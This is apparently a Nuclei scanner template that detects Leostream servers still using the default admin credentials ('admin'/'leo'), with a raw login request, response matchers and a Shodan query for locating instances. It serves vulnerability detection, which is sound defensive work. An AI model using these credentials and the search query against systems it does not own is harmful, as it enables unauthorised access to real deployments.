id: leostream-default-login

info:
  name: Leostream Default Login
  author: bhutch
  severity: high
  description: |
    Leostream default admin credentials were discovered.
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    shodan-query: http.title:"Leostream"
    max-request: 1
    verified: true
  tags: leostream,default-login

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}

        login_type=0&user={{username}}&password={{password}}&submit=SIGN+IN

    payloads:
      username:
        - admin
      password:
        - leo
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Set-Cookie: lld=%21"

      - type: word
        part: header
        words:
          - 'index.pl'
          - 'server.pl'
          - 'status.pl'
        condition: or

      - type: status
        status:
          - 302
